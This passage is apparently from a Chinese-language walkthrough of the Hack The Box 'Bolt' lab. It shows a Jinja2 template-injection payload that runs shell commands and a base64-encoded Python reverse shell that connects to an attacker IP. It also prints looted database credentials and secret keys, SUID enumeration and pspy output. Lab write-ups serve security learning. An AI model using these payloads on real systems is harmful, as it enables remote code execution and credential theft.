+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-group row&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;inputExperience&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-sm-2 col-form-label&#34;</span><span class="p">&gt;</span>Experience<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-sm-10&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">textarea</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-control&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;inputExperience&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;experience&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;Experience&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">textarea</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-group row&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;inputSkills&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-sm-2 col-form-label&#34;</span><span class="p">&gt;</span>Skills<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-sm-10&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-control&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;inputSkills&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;skills&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;Skills&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-group row&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;offset-sm-2 col-sm-10&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;checkbox&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;checkbox&#34;</span><span class="p">&gt;</span> I agree to the <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;#&#34;</span><span class="p">&gt;</span>terms and conditions<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-group row&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;offset-sm-2 col-sm-10&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-danger&#34;</span><span class="p">&gt;</span>Submit<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span> %s <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span> This e-mail serves as confirmation of your profile username changes.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292336044.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292336044.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292336044.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292336044.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292336044.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292336044.png" /></p>
+<p>尝试在这里进行模板注入</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301414778.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301414778.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301414778.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301414778.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301414778.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301414778.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301415951.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301415951.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301415951.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301415951.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301415951.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301415951.png" /></p>
+<p>然后根据网页提示去邮箱<code>mail.bolt.htb</code>检查邮件</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301416844.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301416844.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301416844.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301416844.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301416844.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301416844.png" /></p>
+<p>点击确认连接,邮箱收到新的邮件其中包含模板注入的结果</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301417463.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301417463.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301417463.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301417463.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301417463.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301417463.png" /></p>
+<p><code>{{&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()}}</code>返回<code>www-data</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301420520.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301420520.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301420520.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301420520.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301420520.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301420520.png" /></p>
+<p>反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">250</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;echo &#34;aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgb3MKaXA9IjEwLjEwLjE2LjciCnBvcnQ9ODAwMApzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKGlwLHBvcnQpKQpvcy5kdXAyKHMuZmlsZW5vKCksMCkKb3MuZHVwMihzLmZpbGVubygpLDEpCm9zLmR1cDIocy5maWxlbm8oKSwyKQpwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQoKI3B5dGhvbjMgLWMgJ2ltcG9ydCBwdHk7cHR5LnNwYXduKCIvYmluL2Jhc2giKScK&#34; | base64 -d &gt; /tmp/a.py&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">250</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;python3 /tmp/a.py&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301724933.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301724933.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301724933.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301724933.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301724933.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301724933.png" /></p>
+<p><code>/var/www/demo/config.py</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;Flask Configuration&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#SQLALCHEMY_DATABASE_URI = &#39;sqlite:///database.db&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">SQLALCHEMY_DATABASE_URI</span> <span class="o">=</span> <span class="s1">&#39;mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">SQLALCHEMY_TRACK_MODIFICATIONS</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="s1">&#39;kreepandcybergeek&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">MAIL_SERVER</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">MAIL_PORT</span> <span class="o">=</span> <span class="mi">25</span>
+</span></span><span class="line"><span class="cl"><span class="n">MAIL_USE_TLS</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">MAIL_USE_SSL</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#MAIL_DEBUG = app.debug</span>
+</span></span><span class="line"><span class="cl"><span class="n">MAIL_USERNAME</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl"><span class="n">MAIL_PASSWORD</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl"><span class="n">DEFAULT_MAIL_SENDER</span> <span class="o">=</span> <span class="s1">&#39;support@bolt.htb&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>/var/www/roundcube/config/config.inc.php</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;db_dsnw&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;smtp_log&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;des_key&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;tdqy62YPNdGEeohXtJ2160bX&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;trash_mbox&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="获取root权限">获取root权限</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find / -user root -perm -4000 -print 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/opt/google/chrome/chrome-sandbox
+</span></span><span class="line"><span class="cl">/usr/sbin/pppd
+</span></span><span class="line"><span class="cl">/usr/lib/xorg/Xorg.wrap
+</span></span><span class="line"><span class="cl">/usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span class="line"><span class="cl">/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="cl">/usr/lib/eject/dmcrypt-get-device
+</span></span><span class="line"><span class="cl">/usr/lib/openssh/ssh-keysign
+</span></span><span class="line"><span class="cl">/usr/bin/newgrp
+</span></span><span class="line"><span class="cl">/usr/bin/passwd
+</span></span><span class="line"><span class="cl">/usr/bin/chfn
+</span></span><span class="line"><span class="cl">/usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">/usr/bin/vmware-user-suid-wrapper
+</span></span><span class="line"><span class="cl">/usr/bin/umount
+</span></span><span class="line"><span class="cl">/usr/bin/fusermount
+</span></span><span class="line"><span class="cl">/usr/bin/mount
+</span></span><span class="line"><span class="cl">/usr/bin/su
+</span></span><span class="line"><span class="cl">/usr/bin/sudo
+</span></span><span class="line"><span class="cl">/usr/bin/chsh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>传个<code>pspy</code>上去看看有没有特别的进程</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">     ██▓███    ██████  ██▓███ ▓██   ██▓
+</span></span><span class="line"><span class="cl">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+</span></span><span class="line"><span class="cl">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+</span></span><span class="line"><span class="cl">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+</span></span><span class="line"><span class="cl">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+</span></span><span class="line"><span class="cl">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+</span></span><span class="line"><span class="cl">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+</span></span><span class="line"><span class="cl">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+</span></span><span class="line"><span class="cl">                   ░           ░ ░     
+</span></span><span class="line"><span class="cl">                               ░ ░     
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+</span></span><span class="line"><span class="cl">Draining file system events due to startup...
+</span></span><span class="line"><span class="cl">done
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [32;1mCMD: UID=127  PID=964    | /usr/sbin/mysqld [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=948    | dovecot/config [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=945    | dovecot/log [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=129  PID=944    | dovecot/anvil [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=116  PID=911    | /usr/sbin/kerneloops [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=909    | /sbin/agetty -o -p -- \u --noclear tty1 linux [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=116  PID=904    | /usr/sbin/kerneloops --test [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=886    | php-fpm: pool www                                                             [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [35;1mCMD: UID=120  PID=877    | /usr/bin/whoopsie -f [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=871    | /usr/sbin/dovecot -F [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=867    | nginx: worker process                            [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=866    | nginx: worker process                            [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=865    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=853    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=850    | php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)                       [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=846    | /usr/bin/python3 /usr/local/bin/gunicorn wsgi:app [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=845    | /usr/bin/python3 /usr/local/bin/gunicorn wsgi:app [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=768    | /usr/sbin/ModemManager [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [35;1mCMD: UID=115  PID=682    | avahi-daemon: chroot helper [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=676    | /usr/bin/vmtoolsd [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=667    | /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=651    | /lib/systemd/systemd-logind [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [35;1mCMD: UID=104  PID=644    | /usr/sbin/rsyslogd -n -iNONE [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=633    | /usr/lib/policykit-1/polkitd --no-debug [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=630    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=625    | /usr/sbin/irqbalance --foreground [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=606    | /usr/sbin/NetworkManager --no-daemon [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=103  PID=605    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=604    | /usr/sbin/cron -f [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [35;1mCMD: UID=115  PID=603    | avahi-daemon: running [bolt.local] [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=598    | /usr/sbin/acpid [0m
